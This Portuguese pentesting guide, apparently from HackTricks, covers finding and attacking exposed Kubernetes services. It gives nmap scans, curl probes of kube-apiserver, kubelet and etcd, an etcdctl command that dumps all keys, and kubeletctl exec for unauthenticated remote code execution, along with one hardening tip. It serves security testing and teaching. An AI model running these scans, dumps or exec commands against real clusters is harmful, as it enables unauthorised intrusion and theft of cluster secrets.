# Teste de Penetra√ß√£o em Servi√ßos do Kubernetes

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

O Kubernetes utiliza v√°rios **servi√ßos de rede espec√≠ficos** que podem estar **expostos √† Internet** ou em uma **rede interna uma vez que voc√™ comprometeu um pod**.

## Encontrando pods expostos com OSINT

Uma maneira poderia ser procurar por `Identity LIKE "k8s.%.com"` em [crt.sh](https://crt.sh) para encontrar subdom√≠nios relacionados ao Kubernetes. Outra maneira poderia ser pesquisar `"k8s.%.com"` no github e procurar por arquivos **YAML** contendo a string.

## Como o Kubernetes Exp√µe Servi√ßos

Pode ser √∫til para voc√™ entender como o Kubernetes pode **expor servi√ßos publicamente** para encontr√°-los:

{% content-ref url="../exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](../exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## Encontrando Pods Expostos via varredura de portas

As seguintes portas podem estar abertas em um cluster Kubernetes:

| Porta           | Processo        | Descri√ß√£o                                                              |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Porta da API do Kubernetes                                             |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | M√©tricas de cont√™ineres                                                |
| 6443/TCP        | kube-apiserver | Porta da API do Kubernetes                                             |
| 8443/TCP        | kube-apiserver | Porta da API do Minikube                                               |
| 8080/TCP        | kube-apiserver | Porta da API insegura                                                  |
| 10250/TCP       | kubelet        | API HTTPS que permite acesso total                                    |
| 10255/TCP       | kubelet        | Porta HTTP somente leitura n√£o autenticada: pods, pods em execu√ß√£o e estado do n√≥ |
| 10256/TCP       | kube-proxy     | Servidor de verifica√ß√£o de integridade do Kube Proxy                  |
| 9099/TCP        | calico-felix   | Servidor de verifica√ß√£o de integridade para Calico                    |
| 6782-4/TCP      | weave          | M√©tricas e endpoints                                                   |
| 30000-32767/TCP | NodePort       | Proxy para os servi√ßos                                                 |
| 44134/TCP       | Tiller         | Servi√ßo Helm escutando                                                 |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

Este √© o **servi√ßo de API do Kubernetes** com o qual os administradores geralmente interagem usando a ferramenta **`kubectl`**.

**Portas comuns: 6443 e 443**, mas tamb√©m 8443 no minikube e 8080 como inseguro.
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**Verifique a seguinte p√°gina para aprender como obter dados sens√≠veis e realizar a√ß√µes sens√≠veis ao falar com este servi√ßo:**

{% content-ref url="../kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](../kubernetes-enumeration.md)
{% endcontent-ref %}

### API do Kubelet

Este servi√ßo **roda em cada n√≥ do cluster**. √â o servi√ßo que ir√° **controlar** os pods dentro do **n√≥**. Ele se comunica com o **kube-apiserver**.

Se voc√™ encontrar este servi√ßo exposto, pode ter encontrado um **RCE n√£o autenticado**.

#### API do Kubelet
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
Se a resposta for `N√£o autorizado`, ent√£o requer autentica√ß√£o.

Se voc√™ pode listar n√≥s, voc√™ pode obter uma lista de endpoints de kubelets com:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet (Apenas leitura)
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### API etcd
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller
```
helm --host tiller-deploy.kube-system:44134 version
```
Voc√™ poderia abusar deste servi√ßo para escalar privil√©gios dentro do Kubernetes:

### cAdvisor

Servi√ßo √∫til para coletar m√©tricas.
```
curl -k https://<IP Address>:4194
```
### NodePort

Quando uma porta √© exposta em todos os n√≥s via um **NodePort**, a mesma porta √© aberta em todos os n√≥s, direcionando o tr√°fego para o **Servi√ßo** declarado. Por padr√£o, essa porta estar√° no intervalo de **30000 a 32767**. Portanto, novos servi√ßos n√£o verificados podem ser acess√≠veis por meio dessas portas.
```
sudo nmap -sS -p 30000-32767 <IP>
```
## Configura√ß√µes Vulner√°veis

### Acesso An√¥nimo ao Kube-apiserver

O acesso an√¥nimo aos endpoints da API do **kube-apiserver n√£o √© permitido**. No entanto, voc√™ pode verificar alguns endpoints:

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **Verificando o Acesso An√¥nimo ao ETCD**

O ETCD armazena segredos do cluster, arquivos de configura√ß√£o e outros **dados sens√≠veis**. Por **padr√£o**, o ETCD **n√£o pode** ser acessado **anonimamente**, mas sempre √© bom verificar.

Se o ETCD puder ser acessado anonimamente, talvez seja necess√°rio **utilizar a** [**ferramenta etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md). O comando a seguir ir√° obter todas as chaves armazenadas:
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

A documenta√ß√£o do [**Kubelet**](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) explica que por **padr√£o o acesso an√¥nimo ao servi√ßo √© permitido:**

> Habilita solicita√ß√µes an√¥nimas para o servidor Kubelet. Solicita√ß√µes que n√£o s√£o rejeitadas por outro m√©todo de autentica√ß√£o s√£o tratadas como solicita√ß√µes an√¥nimas. Solicita√ß√µes an√¥nimas t√™m um nome de usu√°rio `system:anonymous` e um nome de grupo `system:unauthenticated`

Para entender melhor como a **autentica√ß√£o e autoriza√ß√£o da API do Kuebelet** funcionam, consulte esta p√°gina:

{% content-ref url="kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

O **servi√ßo Kubelet** **API n√£o √© documentado**, mas o c√≥digo fonte pode ser encontrado aqui e encontrar os endpoints expostos √© t√£o f√°cil quanto **executar**:
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
Todos eles parecem interessantes.

Voc√™ pode usar a ferramenta [**Kubeletctl**](https://github.com/cyberark/kubeletctl) para interagir com Kubelets e seus endpoints.

#### /pods

Este endpoint lista pods e seus containers:
```bash
kubeletctl pods
```
#### /exec

Este endpoint permite executar c√≥digo dentro de qualquer container de forma muito f√°cil:
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
Para evitar esse ataque, o servi√ßo _**kubelet**_ deve ser executado com `--anonymous-auth false` e o servi√ßo deve ser segregado ao n√≠vel da rede.
{% endhint %}

### **Verifica√ß√£o da Exposi√ß√£o de Informa√ß√µes do Porta de Leitura Apenas do Kubelet**

Quando uma **porta de leitura apenas do kubelet** √© exposta, torna-se poss√≠vel recuperar informa√ß√µes da API por partes n√£o autorizadas. A exposi√ß√£o dessa porta pode levar √† divulga√ß√£o de v√°rios **elementos de configura√ß√£o do cluster**. Embora as informa√ß√µes, incluindo **nomes de pods, localiza√ß√µes de arquivos internos e outras configura√ß√µes**, possam n√£o ser cr√≠ticas, sua exposi√ß√£o ainda representa um risco de seguran√ßa e deve ser evitada.

Um exemplo de como essa vulnerabilidade pode ser explorada envolve um atacante remoto acessando uma URL espec√≠fica. Ao navegar para `http://<external-IP>:10255/pods`, o atacante pode potencialmente recuperar informa√ß√µes sens√≠veis do kubelet:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## Refer√™ncias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
